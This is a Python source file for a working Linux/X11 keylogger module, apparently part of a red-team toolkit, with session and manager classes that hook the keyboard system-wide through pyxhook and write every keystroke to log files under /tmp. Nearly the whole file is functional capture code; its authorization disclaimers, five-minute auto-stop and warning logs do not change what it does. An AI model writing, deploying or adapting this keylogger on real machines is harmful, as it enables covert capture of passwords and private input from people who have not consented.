"""
Keylogger Module for Authorized Security Testing

CRITICAL WARNING: This module captures keyboard input and is ONLY for:
- Authorized penetration testing with explicit written permission
- Security research in isolated/controlled environments
- Demonstration purposes with full disclosure
- Testing on systems you own

Unauthorized use is ILLEGAL and unethical. This tool should NEVER be deployed
without proper authorization, legal agreements, and ethical approval.

REQUIREMENTS:
- Must run on Linux with X11 (pyxhook dependency)
- Requires root/sudo privileges for system-wide keyboard hooking
- Only works in graphical environments (not headless servers)
"""

import logging
import os
import threading
import time
from typing import Dict, Any, Optional
from datetime import datetime, timedelta

logger = logging.getLogger(__name__)

# Global flag to track if pyxhook is available
PYXHOOK_AVAILABLE = False
try:
    import pyxhook
    PYXHOOK_AVAILABLE = True
    logger.info("pyxhook module loaded successfully")
except ImportError:
    logger.warning("pyxhook not available - keylogger functionality disabled")
    logger.warning("Install with: pip install pyxhook")


class KeyloggerSession:
    """
    Manages a single keylogger session with automatic timeout and controls.

    IMPORTANT: Only use for authorized security testing.
    """

    def __init__(self, session_id: str, output_dir: str = '/tmp/redteam_keylogs',
                 max_duration: int = 300, auto_stop: bool = True):
        """
        Initialize a keylogger session.

        Args:
            session_id: Unique identifier for this session
            output_dir: Directory to store keylog files
            max_duration: Maximum duration in seconds (default: 5 minutes)
            auto_stop: Automatically stop after max_duration
        """
        if not PYXHOOK_AVAILABLE:
            raise RuntimeError("pyxhook is not installed. Cannot create keylogger session.")

        self.session_id = session_id
        self.output_dir = output_dir
        self.max_duration = max_duration
        self.auto_stop = auto_stop

        # Create output directory
        os.makedirs(output_dir, exist_ok=True)

        # Session state
        self.log_file = os.path.join(output_dir, f"keylog_{session_id}.txt")
        self.is_running = False
        self.start_time = None
        self.end_time = None
        self.hook_manager = None
        self.hook_thread = None
        self.keys_captured = 0

        logger.warning(f"⚠️  KEYLOGGER SESSION CREATED: {session_id}")
        logger.warning(f"⚠️  Log file: {self.log_file}")
        logger.warning(f"⚠️  Max duration: {max_duration}s, Auto-stop: {auto_stop}")

    def _on_key_press(self, event):
        """Callback function for key press events."""
        if not self.is_running:
            return

        try:
            # Check if we've exceeded max duration
            if self.auto_stop and self.start_time:
                elapsed = (datetime.now() - self.start_time).total_seconds()
                if elapsed > self.max_duration:
                    logger.warning(f"Session {self.session_id} reached max duration, stopping...")
                    self.stop()
                    return

            # Write keystroke to file with timestamp
            timestamp = datetime.now().isoformat()
            key = event.Key if hasattr(event, 'Key') else str(event)

            with open(self.log_file, 'a') as f:
                # Format: [timestamp] key
                if key == 'Return':
                    f.write('\n')
                elif key == 'space':
                    f.write(' ')
                elif key == 'BackSpace':
                    f.write('[BACKSPACE]')
                elif key.startswith('KP_'):  # Keypad keys
                    f.write(key.replace('KP_', '[KP]'))
                elif len(key) == 1:
                    f.write(key)
                else:
                    f.write(f'[{key}]')

            self.keys_captured += 1

        except Exception as e:
            logger.error(f"Error in key press handler: {e}")

    def start(self) -> Dict[str, Any]:
        """Start the keylogger session."""
        if self.is_running:
            return {
                "success": False,
                "message": "Session is already running"
            }

        try:
            logger.warning(f"🔴 STARTING KEYLOGGER SESSION: {self.session_id}")

            # Initialize the hook manager
            self.hook_manager = pyxhook.HookManager()
            self.hook_manager.KeyDown = self._on_key_press
            self.hook_manager.HookKeyboard()

            # Start in a separate thread
            def run_hook():
                try:
                    self.hook_manager.start()
                except Exception as e:
                    logger.error(f"Hook thread error: {e}")
                    self.is_running = False

            self.hook_thread = threading.Thread(target=run_hook, daemon=True)
            self.hook_thread.start()

            self.is_running = True
            self.start_time = datetime.now()

            # Write session header to log file
            with open(self.log_file, 'a') as f:
                f.write(f"\n{'='*60}\n")
                f.write(f"KEYLOGGER SESSION STARTED: {self.session_id}\n")
                f.write(f"Start Time: {self.start_time.isoformat()}\n")
                f.write(f"Max Duration: {self.max_duration}s\n")
                f.write(f"{'='*60}\n\n")

            return {
                "success": True,
                "message": "Keylogger session started",
                "session_id": self.session_id,
                "start_time": self.start_time.isoformat(),
                "max_duration": self.max_duration,
                "log_file": self.log_file
            }

        except Exception as e:
            logger.error(f"Failed to start keylogger: {e}", exc_info=True)
            self.is_running = False
            return {
                "success": False,
                "message": f"Failed to start keylogger: {str(e)}"
            }

    def stop(self) -> Dict[str, Any]:
        """Stop the keylogger session."""
        if not self.is_running:
            return {
                "success": False,
                "message": "Session is not running"
            }

        try:
            logger.warning(f"🛑 STOPPING KEYLOGGER SESSION: {self.session_id}")

            self.is_running = False
            self.end_time = datetime.now()

            # Stop the hook
            if self.hook_manager:
                self.hook_manager.cancel()

            # Write session footer to log file
            duration = (self.end_time - self.start_time).total_seconds()
            with open(self.log_file, 'a') as f:
                f.write(f"\n\n{'='*60}\n")
                f.write(f"KEYLOGGER SESSION ENDED: {self.session_id}\n")
                f.write(f"End Time: {self.end_time.isoformat()}\n")
                f.write(f"Duration: {duration:.2f}s\n")
                f.write(f"Keys Captured: {self.keys_captured}\n")
                f.write(f"{'='*60}\n")

            return {
                "success": True,
                "message": "Keylogger session stopped",
                "session_id": self.session_id,
                "duration": duration,
                "keys_captured": self.keys_captured,
                "log_file": self.log_file
            }

        except Exception as e:
            logger.error(f"Error stopping keylogger: {e}", exc_info=True)
            return {
                "success": False,
                "message": f"Error stopping keylogger: {str(e)}"
            }

    def get_status(self) -> Dict[str, Any]:
        """Get the current status of the session."""
        status = {
            "session_id": self.session_id,
            "is_running": self.is_running,
            "keys_captured": self.keys_captured,
            "log_file": self.log_file
        }

        if self.start_time:
            status["start_time"] = self.start_time.isoformat()
            if self.is_running:
                elapsed = (datetime.now() - self.start_time).total_seconds()
                status["elapsed_seconds"] = elapsed
                status["remaining_seconds"] = max(0, self.max_duration - elapsed)

        if self.end_time:
            status["end_time"] = self.end_time.isoformat()
            status["duration"] = (self.end_time - self.start_time).total_seconds()

        return status

    def get_logs(self, last_n_chars: Optional[int] = None) -> str:
        """
        Read the captured keylogs.

        Args:
            last_n_chars: If specified, return only the last N characters

        Returns:
            String containing the keylogs
        """
        try:
            if not os.path.exists(self.log_file):
                return ""

            with open(self.log_file, 'r') as f:
                content = f.read()

            if last_n_chars and len(content) > last_n_chars:
                return content[-last_n_chars:]

            return content

        except Exception as e:
            logger.error(f"Error reading keylogs: {e}")
            return f"Error reading logs: {str(e)}"

    def cleanup(self) -> bool:
        """Clean up session resources and delete log file."""
        try:
            if self.is_running:
                self.stop()

            if os.path.exists(self.log_file):
                os.remove(self.log_file)
                logger.info(f"Deleted log file: {self.log_file}")

            return True

        except Exception as e:
            logger.error(f"Error during cleanup: {e}")
            return False


class KeyloggerManager:
    """
    Manages multiple keylogger sessions.

    IMPORTANT: Only use for authorized security testing.
    """

    def __init__(self):
        self.sessions: Dict[str, KeyloggerSession] = {}
        self.max_concurrent_sessions = 3

        logger.warning("⚠️  KeyloggerManager initialized - AUTHORIZED USE ONLY")

    def create_session(self, session_id: str, max_duration: int = 300,
                      auto_stop: bool = True) -> Dict[str, Any]:
        """Create a new keylogger session."""

        if not PYXHOOK_AVAILABLE:
            return {
                "success": False,
                "message": "pyxhook is not installed. Install with: pip install pyxhook"
            }

        if session_id in self.sessions:
            return {
                "success": False,
                "message": f"Session {session_id} already exists"
            }

        if len(self.sessions) >= self.max_concurrent_sessions:
            return {
                "success": False,
                "message": f"Maximum concurrent sessions ({self.max_concurrent_sessions}) reached"
            }

        try:
            session = KeyloggerSession(
                session_id=session_id,
                max_duration=max_duration,
                auto_stop=auto_stop
            )
            self.sessions[session_id] = session

            return {
                "success": True,
                "message": "Session created",
                "session_id": session_id
            }

        except Exception as e:
            logger.error(f"Error creating session: {e}")
            return {
                "success": False,
                "message": f"Error creating session: {str(e)}"
            }

    def get_session(self, session_id: str) -> Optional[KeyloggerSession]:
        """Get a session by ID."""
        return self.sessions.get(session_id)

    def list_sessions(self) -> Dict[str, Any]:
        """List all sessions."""
        return {
            "total_sessions": len(self.sessions),
            "sessions": [
                session.get_status()
                for session in self.sessions.values()
            ]
        }

    def delete_session(self, session_id: str, cleanup: bool = True) -> Dict[str, Any]:
        """Delete a session."""
        session = self.sessions.get(session_id)
        if not session:
            return {
                "success": False,
                "message": f"Session {session_id} not found"
            }

        if cleanup:
            session.cleanup()

        del self.sessions[session_id]

        return {
            "success": True,
            "message": f"Session {session_id} deleted"
        }
